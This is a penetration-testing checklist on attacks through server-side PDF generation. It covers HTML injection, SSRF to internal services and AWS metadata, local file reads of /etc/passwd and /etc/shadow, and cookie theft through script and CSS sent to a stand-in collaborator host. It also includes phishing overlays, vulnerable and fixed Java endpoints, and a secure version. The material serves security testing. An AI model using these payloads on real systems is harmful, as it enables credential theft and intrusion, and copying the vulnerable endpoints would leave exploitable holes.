

**PDF-based attacks** occur when user-controlled input is embedded into a PDF generation process without sanitization, or when a PDF viewer renders malicious content. The most common paths are server-side HTML-to-PDF conversion (leading to SSRF and local file read), JavaScript execution inside PDF viewers, and XSS via PDF content rendered in the browser.

```
User input → HTML template → PDF engine renders HTML → PDF file

Common engines:
wkhtmltopdf       headless WebKit    (renders full HTML, JS, CSS)
Puppeteer         headless Chrome    (renders full HTML, JS, CSS)
PhantomJS         headless WebKit    (legacy)
iText / Apache PDFBox  Java libs     (no HTML rendering, direct PDF construction)
WeasyPrint        Python             (HTML/CSS to PDF, no JS)
Docraptor         cloud service      (HTML to PDF)
```

Engines that render a full browser (wkhtmltopdf, Puppeteer, PhantomJS) are the most dangerous  they execute JavaScript and make HTTP requests, making SSRF and local file read trivial.


## Injection Points

- Any field whose value ends up inside a PDF (name, address, invoice notes, report title, search queries in exported reports)
- HTML-to-PDF export endpoints (`/export`, `/download`, `/report`, `/invoice`)
- File upload fields where uploaded content is embedded into a generated PDF
- Headers and footers of PDF templates that include user data
- Watermark or annotation fields
- Filename of the generated PDF if reflected

---

## Checklist

### Detection

- [ ]  Find any feature that generates a PDF containing user-supplied data
- [ ]  Inject a simple HTML tag and check if it renders in the PDF:
```html
	<b>INJECT</b>
```

```
If the word appears bold in the PDF → HTML is being interpreted → full injection possible
```

- [ ]  Inject an image tag pointing to Collaborator to confirm server-side rendering:

```html
	<img src="http://OASTIFY.COM/detect">
```

```
If you get an HTTP hit → the PDF engine is making outbound requests → SSRF confirmed
```

- [ ]  Check the PDF metadata for the engine name (open in a PDF reader or run `exiftool file.pdf`):

```
	Creator: wkhtmltopdf 0.12.6
	Producer: Qt 4.8.7
```

### SSRF via PDF Generation

- [ ]  Inject an iframe or img pointing to internal resources:

```html
	<iframe src="http://127.0.0.1:8080/admin">
	<iframe src="http://169.254.169.254/latest/meta-data/">
	<img src="http://192.168.1.1/">
```

- [ ]  Use the iframe to render the full internal admin panel into the PDF:


```html
	<iframe src="http://localhost:6566/secret" width="800" height="600">
```

- [ ]  Try common internal service ports:

```
	http://127.0.0.1:8080
	http://127.0.0.1:8443
	http://127.0.0.1:9200   ← Elasticsearch
	http://127.0.0.1:6379   ← Redis
	http://127.0.0.1:5984   ← CouchDB
	http://127.0.0.1:4000   ← internal apps
```

### Local File Read via PDF Generation

- [ ]  Use `file://` scheme to read local files directly into the PDF:

```html
	<iframe src="file:///etc/passwd" width="800" height="600">
	<img src="file:///etc/hostname">
```

- [ ]  Combine with annotation or link elements:


```html
	<a href="file:///etc/shadow">click</a>
```

- [ ]  Read application source code:


```html
	<iframe src="file:///var/www/html/config.php">
	<iframe src="file:///app/application.properties">
```

### XSS via PDF

- [ ]  If the PDF is served inline in the browser (`Content-Disposition: inline`) and the viewer executes JavaScript, inject JS actions:


```javascript
	// PDF JavaScript — executes when PDF opens in certain viewers
	app.alert("XSS");
	this.getURL("https://OASTIFY.COM?c=" + app.getField("cookie").value);
```

- [ ]  Inject HTML that includes scripts if the renderer executes JS:

```html
	<script>document.location='https://OASTIFY.COM?c='+document.cookie</script>
```

- [ ]  Try injecting into the PDF filename — if reflected in a `Content-Disposition` header:

```
	filename="test.pdf" → filename="<script>alert(1)</script>.pdf"
```

### HTML Injection in PDF (Stored/Reflected)

- [ ]  Even without JS execution, HTML injection into PDFs can be used to:
    - Overlay fake content (phishing, fake invoices)
    - Exfiltrate data via CSS injection
    - Perform link injection

**CSS exfil in PDFs:**


```html
<style>
@font-face {
    font-family: leak;
    src: url('https://OASTIFY.COM/?data=') format('truetype');
}
body { font-family: leak; }
</style>
```

**Fake content overlay:**

```html
<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
    <h1>Your account has been suspended. Call 1-800-ATTACKER.</h1>
</div>
```

### Annotation and Link Injection

- [ ]  Inject clickable links into the PDF:


```html
	<a href="https://evil.com">Click here to verify your account</a>
```

### PDF Upload Attacks

- [ ]  If the app accepts PDF uploads and processes them server-side, embed XXE in the PDF XML structure
- [ ]  Embed JavaScript in PDF `/OpenAction` — executes when opened in Adobe Reader:

```
	/OpenAction << /Type /Action /S /JavaScript /JS (app.alert\("XSS"\);) >>
```

- [ ]  Embed a polyglot PDF that is also valid HTML — served as HTML it executes scripts, served as PDF it opens cleanly

---

## Attack Payloads

**SSRF to internal metadata (AWS):**


```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" width="800" height="600">
```

**Local file read:**


```html
<iframe src="file:///etc/passwd" width="500" height="500">
```

**Cookie steal via JS in PDF rendering engine:**


```html
<script>document.write('<img src="https://OASTIFY.COM?c='+document.cookie+'" />')</script>
```

**Blind SSRF detection:**

```html
<img src="http://OASTIFY.COM/pdftest">
```

**Full internal page render in PDF:**


```html
<iframe src="http://localhost/admin" width="100%" height="100%" style="border:none;">
```

---

## White Box Testing

**Vulnerable, user input passed directly to wkhtmltopdf via HTML template:**


```java
@GetMapping("/invoice/download")
public ResponseEntity<byte[]> downloadInvoice(@RequestParam Long invoiceId,
                                               @AuthenticationPrincipal UserDetails user) throws Exception {
    Invoice invoice = invoiceService.findById(invoiceId);

    // user-controlled fields embedded directly into HTML string
    String html = "<html><body>"
        + "<h1>Invoice for: " + invoice.getCustomerName() + "</h1>"  // no encoding
        + "<p>Notes: " + invoice.getNotes() + "</p>"                  // attacker injects iframe/script here
        + "</body></html>";

    // wkhtmltopdf renders this HTML including any injected iframes or scripts
    byte[] pdf = pdfService.generateFromHtml(html);
    return ResponseEntity.ok()
        .header("Content-Disposition", "attachment; filename=invoice.pdf")
        .body(pdf);
}
```

**Vulnerable, Puppeteer/headless Chrome with no URL restrictions:**

```java
@PostMapping("/report/export")
public ResponseEntity<byte[]> exportReport(@RequestBody ReportRequest req) throws Exception {
    // req.getTemplateUrl() is user-controlled — points to any URL including file:// and internal IPs
    String url = req.getTemplateUrl();

    // Puppeteer fetches whatever URL is passed — SSRF and local file read possible
    byte[] pdf = puppeteerService.generatePdf(url);
    return ResponseEntity.ok().body(pdf);
}
```

**Vulnerable, Content-Disposition filename not sanitized — header injection:**


```java
@GetMapping("/export")
public ResponseEntity<byte[]> export(@RequestParam String reportName) throws Exception {
    byte[] pdf = reportService.generate(reportName);
    // reportName is unsanitized — attacker injects newlines to break headers
    return ResponseEntity.ok()
        .header("Content-Disposition", "attachment; filename=" + reportName + ".pdf")
        .body(pdf);
}
```

**Secure:**


```java
@GetMapping("/invoice/download")
public ResponseEntity<byte[]> downloadInvoice(@RequestParam Long invoiceId,
                                               @AuthenticationPrincipal UserDetails user) throws Exception {
    Invoice invoice = invoiceService.findById(invoiceId);

    // HTML-encode all user-controlled fields before embedding in template
    String safeName = HtmlUtils.htmlEscape(invoice.getCustomerName());
    String safeNotes = HtmlUtils.htmlEscape(invoice.getNotes());

    String html = "<html><body>"
        + "<h1>Invoice for: " + safeName + "</h1>"
        + "<p>Notes: " + safeNotes + "</p>"
        + "</body></html>";

    // Disable external resource loading in wkhtmltopdf
    // --disable-local-file-access --no-images --disable-javascript
    byte[] pdf = pdfService.generateFromHtml(html, PdfOptions.builder()
        .disableLocalFileAccess(true)
        .disableJavascript(true)
        .disableExternalLinks(true)
        .build());

    // Sanitize filename — only allow alphanumeric and hyphens
    String safeFilename = invoiceId.toString().replaceAll("[^a-zA-Z0-9\\-]", "") + ".pdf";

    return ResponseEntity.ok()
        .header("Content-Disposition", "attachment; filename=\"" + safeFilename + "\"")
        .body(pdf);
}

// For Puppeteer — restrict to only known safe URLs, never user-controlled
private static final String ALLOWED_TEMPLATE_BASE = "https://templates.internal.company.com/";

private void validateTemplateUrl(String url) {
    if (!url.startsWith(ALLOWED_TEMPLATE_BASE)) {
        throw new SecurityException("Untrusted template URL");
    }
}
```

---

## Resources

- [PortSwigger SSRF via PDF](https://portswigger.net/web-security/ssrf)
- [HackTricks PDF Injection](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/pdf-injection)
- [PayloadsAllTheThings PDF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PDF%20Injection)
- [wkhtmltopdf SSRF Research](https://www.blackhat.com/docs/us-17/thursday/us-17-Natal-Server-Side-PDF-Generation-And-Related-Vulnerabilities.pdf)